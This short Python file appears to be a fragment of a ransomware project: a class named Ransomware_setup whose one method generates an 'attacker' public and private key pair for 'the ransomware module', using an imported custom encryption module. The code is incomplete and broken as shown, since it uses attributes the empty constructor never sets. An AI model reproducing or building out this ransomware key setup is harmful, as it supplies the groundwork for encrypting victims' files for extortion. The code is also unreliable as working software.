from Asymetric_Encryption import *

class Ransomware_setup:

    def __init__(self):
        pass
    
    def generate_root_keys(self):
        """
        a method which generates a unique pair of asymmetric encryption keys for the ransomware module
        """

        encryption_attacker = Encryption(self.id, f"{self.folder}\\public_attacker.pem",f"{self.folder}\\private_attacker.pem")
        # Generate key pairs
        encryption_attacker.generate_keys()




    